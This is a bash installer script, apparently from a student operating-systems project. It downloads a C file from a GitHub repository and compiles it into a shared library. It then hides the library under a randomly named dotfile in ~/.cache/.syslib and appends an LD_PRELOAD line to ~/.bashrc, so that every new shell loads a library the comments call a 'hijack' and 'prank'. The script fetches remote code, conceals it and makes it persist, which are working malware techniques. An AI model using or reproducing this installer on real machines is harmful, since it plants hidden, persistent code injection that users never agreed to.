#!/bin/bash

# IMPORTANT NOTE: READ ME BEFORE EXECUTING!!!
# This Script makes the hijack work for every new terminal after execution.
# To undo: remove the last two LD_PRELOAD lines in ~/.bashrc and restart your shell.



REPO_URL="https://raw.githubusercontent.com/carina-fehr/osProject/main"
C_FILE="preloadLib.c"
SO_NAME="preloadLib.so"
BASHRC="$HOME/.bashrc"
HIDDEN_DIR="$HOME/.cache/.syslib"
MARKER="# [LD_PRELOAD injected]"

NEW_NAME=".lib$(head /dev/urandom | tr -dc a-z0-9 | head -c 8).so"
HIDDEN_SO="$HIDDEN_DIR/$NEW_NAME" # hides the .so in a hidden directory with a random name 

echo "[*] Starting installation..."
sleep 1
echo "[*] Downloading C file from GitHub..."
wget -q -O "$C_FILE" "$REPO_URL/$C_FILE"

if [ ! -s "$C_FILE" ]; then
    echo "[x] Error: Failed to download $C_FILE or file is empty."
    exit 1
fi

echo "[*] Compiling $C_FILE to $SO_NAME..."
gcc -shared -fPIC -o "$SO_NAME" "$C_FILE" -ldl

echo "[*] Creating hidden directory: $HIDDEN_DIR"
mkdir -p "$HIDDEN_DIR"

echo "[*] Copying .so to hidden location..."
cp "$SO_NAME" "$HIDDEN_SO"
chmod 755 "$HIDDEN_SO"

echo "[*] Injecting LD_PRELOAD into ~/.bashrc"
# Remove any previous injection first
sed -i "/$MARKER/,+2d" "$BASHRC"

# Inject LD_PRELOAD into .bashrc
echo "" >> "$BASHRC"
echo "$MARKER" >> "$BASHRC"
echo "export LD_PRELOAD=\"$HIDDEN_SO\"" >> "$BASHRC"
echo "alias geary='DISABLE_WRITE_PRANK=1 geary'" >> "$BASHRC"

# Cleanup
rm -f "$SO_NAME"
rm -f "$C_FILE"

echo "[✓] Install complete."
echo "[!] Open a new terminal to continue testing."
echo "[!] preloadLib.so hidden at: $HIDDEN_SO"

# Optional: Launch new bash session without getchar prank
DISABLE_GETCHAR_PRANK=1 bash
